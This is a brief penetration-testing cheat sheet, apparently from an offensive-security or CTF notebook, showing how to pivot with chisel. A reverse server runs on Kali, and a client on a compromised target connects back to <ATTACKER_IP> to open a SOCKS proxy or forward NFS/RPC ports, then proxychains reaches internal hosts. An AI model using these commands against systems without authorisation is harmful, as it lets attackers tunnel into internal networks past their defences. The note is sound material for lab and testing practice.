on kali: 
```bash
./chisel server -p 8080 --reverse
```

on target:
```powershell
.\chisel.exe client <ATTACKER_IP>:8080 R:socks

# or linux
./chisel client <YOUR_KALI_IP>:8080 R:111:172.18.0.1:111 R:2049:172.18.0.1:2049 &    # for forwarding 111 and 2049
./chisel client <KALI_IP>:8080 R:socks # to use SOCKS to forward everything

```

then 
```bash
proxychains curl http://localhost/
```